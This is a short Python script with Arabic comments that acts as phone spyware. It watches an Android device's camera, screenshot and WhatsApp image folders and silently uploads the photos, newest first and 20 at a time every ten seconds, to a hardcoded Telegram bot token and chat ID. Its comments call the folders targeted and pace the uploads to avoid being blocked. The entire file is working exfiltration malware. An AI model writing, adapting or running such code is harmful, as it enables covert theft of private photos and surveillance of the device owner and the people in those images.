import os
import time
import requests

# إعدادات الربط
BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
CHAT_ID = "6110903337"

# المجلدات المستهدفة
WATCH_FOLDERS = [
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Pictures/Screenshots",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images"
]

sent_files = set()

def send_file(path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(path, "rb") as f:
            r = requests.post(
                url, 
                data={"chat_id": CHAT_ID}, 
                files={"document": f}, 
                timeout=30
            )
        return r.status_code == 200
    except:
        return False

def balanced_scan_cycle():
    all_files = []
    for folder in WATCH_FOLDERS:
        if os.path.exists(folder):
            try:
                # جمع كل الصور المتاحة
                files = [os.path.join(folder, f) for f in os.listdir(folder) 
                         if f.lower().endswith((".jpg", ".jpeg", ".png"))]
                all_files.extend(files)
            except: continue

    # الترتيب: الأحدث أولاً (لضمان سحب الجديد والقديم بالتدريج)
    all_files.sort(key=os.path.getmtime, reverse=True)

    count = 0
    for img in all_files:
        if count >= 20: break # التوقف عند إرسال 20 صورة لضمان عدم الحظر
        
        if img not in sent_files:
            if send_file(img):
                sent_files.add(img)
                count += 1
                time.sleep(2) # تأخير بسيط (ثانيتين) لراحة سيرفرات تليجرام

def main():
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      data={"chat_id": CHAT_ID, "text": "✅ تم تفعيل الوضع المتوازن: 20 صورة كل 10 ثوانٍ."})
    except: pass
    
    while True:
        balanced_scan_cycle()
        # انتظار 10 ثوانٍ قبل الدورة القادمة
        time.sleep(10)

if __name__ == "__main__":
    main()
